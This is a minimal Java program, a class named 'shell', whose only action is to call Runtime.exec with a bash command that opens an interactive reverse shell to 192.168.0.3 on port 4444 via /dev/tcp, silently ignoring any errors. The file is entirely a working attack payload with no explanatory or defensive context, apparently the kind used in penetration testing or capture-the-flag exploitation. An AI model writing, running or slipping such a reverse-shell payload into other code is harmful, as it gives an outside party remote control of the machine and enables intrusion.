import java.io.BufferedReader;
import java.io.InputStreamReader;

public class shell {
    public static void main(String args[]) {
        String s;
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/192.168.0.3/4444 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}